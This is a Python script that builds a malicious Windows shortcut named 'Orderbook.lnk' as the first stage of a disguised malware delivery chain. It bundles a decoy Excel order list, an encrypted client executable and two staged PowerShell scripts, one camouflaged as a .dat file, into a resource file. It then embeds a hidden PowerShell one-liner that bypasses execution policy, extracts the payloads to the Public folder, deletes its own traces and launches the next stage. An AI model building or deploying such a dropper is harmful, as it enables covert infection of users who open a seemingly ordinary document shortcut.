import os
import sys
import hashlib
from win32com.client import Dispatch
from typing import List, Dict

def compress_powershell_script(script_content: str) -> str:
    """
    Compress the PowerShell script content into a single line
    while maintaining its original functionality.
    """
    lines = script_content.splitlines()

    # Remove lines starting with `#` and strip extra whitespace
    code_lines = [line.strip() for line in lines if not line.strip().startswith("#")]
    code_lines = list(filter(None, code_lines))

    # Combine lines intelligently
    # If a line already ends with ';', do not add another
    oneliner = []
    for line in code_lines:
        if line.endswith(";"):
            oneliner.append(line)
        else:
            oneliner.append(line + ";")

    # Join all parts into a single line, ensuring proper spacing
    return " ".join(oneliner)

def create_resource_file(data_paths: List[str], output_path: str) -> Dict[str, int]:
    """
    Create a dummy data file that stores arbitrary data in the specified paths.
    Concatenates the contents of the files listed in data_paths and writes to output_path.
    Returns a dictionary of offsets in bytes for each file in the output file.
    """
    offsets = {}
    current_offset = 0

    try:
        with open(output_path, "wb") as f:
            for data_path in data_paths:
                abs_data_path = os.path.abspath(data_path)
                if not os.path.isfile(abs_data_path):
                    print(f"Warning: {abs_data_path} does not exist and will be skipped.")
                    continue
                with open(abs_data_path, "rb") as data_file:
                    data = data_file.read()
                    f.write(data)
                    current_offset += len(data)
                    print(f"Writing {abs_data_path} to {output_path} at offset {current_offset}")
                    offsets[data_path] = current_offset
    except Exception as e:
        print(f"Error while creating dummy data file: {e}")
        sys.exit(1)

    return offsets

def create_lnk_shortcut(shortcut_path: str, target_path: str, arguments: str = '', working_directory: str = '', icon_path: str = ''):
    """
    Creates a Windows shortcut (.lnk file).

    :param shortcut_path: Full path where the shortcut will be created.
    :param target_path: The executable or script the shortcut points to.
    :param arguments: Command-line arguments for the target.
    :param working_directory: The working directory for the shortcut.
    :param icon_path: Path to the icon file for the shortcut.
    """
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.Arguments = arguments
        print(f"shortcut.TargetPath: {shortcut.TargetPath}")
        print(f"shortcut.Arguments: {shortcut.Arguments}")
        shortcut.WorkingDirectory = working_directory if working_directory else os.path.dirname(target_path)
        if icon_path:
            shortcut.IconLocation = icon_path
        shortcut.save()
        print(f"Shortcut created at: {shortcut_path}")
    except Exception as e:
        print(f"Failed to create shortcut: {e}")
        sys.exit(1)

def get_powershell_path() -> str:
    """
    Retrieves the path to the PowerShell executable.
    """
    system_root = os.environ.get('SystemRoot', 'C:\\Windows')
    potential_paths = [
        os.path.join(system_root, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe'),
        os.path.join(system_root, 'SysWOW64', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
    ]
    for path in potential_paths:
        if os.path.isfile(path):
            return path
    print("PowerShell executable not found.")
    sys.exit(1)

if __name__ == "__main__":
    ## Step 1: Create the dummy data
    # Define data paths (use absolute paths for reliability)
    data_paths = [
        os.path.abspath("../asset/KnightShopOrderList.xlsx"),      #           Benign Excel file
        os.path.abspath("../../client/dist/client_encrypted.exe"), #           Encrypted client executable
        os.path.abspath("../scripts/find.ps1"),                    # (Stage 2) PowerShell script to decrypt the client executable
        os.path.abspath("../scripts/search.dat"),                  # (Stage 3) PowerShell script camouflaged as a data file, invoked by Stage 2
    ]
    output_path = os.path.abspath("resource.bin")
    offsets = create_resource_file(data_paths, output_path)

    # Calculate the MD5 hash of the dummy data file
    with open(output_path, "rb") as f:
        resource = f.read()
        md5_hash = hashlib.md5(resource).hexdigest()

    # Ensure that the required files were written
    if not os.path.isfile(output_path):
        print(f"Error: {output_path} was not created.")
        sys.exit(1)

    ## Step 2: Create the PowerShell script
    # Injected PowerShell Script Content
    ps1_content = f"""
using namespace System.IO

# Self-discovery to find the location of the shortcut(this)
$target = 'Orderbook.lnk'
$searchDir = $env:USERPROFILE
$lnk = Get-ChildItem -Path $searchDir -Recurse -Filter $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DirectoryName

if (-not $lnk) {{
    # Unable to proceed
    exit -1
}}

# Ensure that the dummy data file also exists in the current position and hash check
$dummy = Join-Path $lnk 'resource.bin'
$md5 = (Get-FileHash -Path $dummy -Algorithm MD5).Hash
if ($md5 -ne '{md5_hash}') {{ exit -1 }}

$ofs=@(0, {offsets[data_paths[0]]},{offsets[data_paths[1]]},{offsets[data_paths[2]]},{offsets[data_paths[3]]})
$fs=[File]::OpenRead($dummy)
$br=New-Object BinaryReader($fs)
for($i=0;$i-lt$ofs.Count-1;$i++){{
    $sOff=$ofs[$i]
    $eOff=$ofs[$i+1]
    $len=$eOff-$sOff
    $fs.Seek($sOff,0)
    $outPath=if($i-eq 0){{Join-Path $lnk 'order.xlsx'}}else{{Join-Path $env:public @('c.exe.e','find.ps1','search.dat')[$i-1]}}
    [File]::WriteAllBytes($outPath,$br.ReadBytes($len))
}}

$br.Close()
$fs.Close()

# Remove myself and resource file
Remove-Item -Path $dummy
$me = Join-Path $lnk $target
Remove-Item -Path $me

& (Join-Path $env:public 'find.ps1')
"""

    # Compress the PowerShell script
    compressed_ps1 = compress_powershell_script(ps1_content)

    ## Step 3: Create the lnk shortcut file to deliver the payload
    # Create the lnk shortcut file
    try:
        current_directory = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        current_directory = os.getcwd()

    shortcut_name = "Orderbook.lnk"
    shortcut_path = os.path.join(current_directory, shortcut_name)
    cmd_path = "C:\WINDOWS\system32\cmd.exe"
    arguments = f'cmd /c start /min "" powershell -ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
    working_directory = current_directory
    icon_path = cmd_path

    # Create the lnk file shortcut
    create_lnk_shortcut(
        shortcut_path=shortcut_path,
        target_path=cmd_path,
        arguments=arguments,
        icon_path=icon_path
    )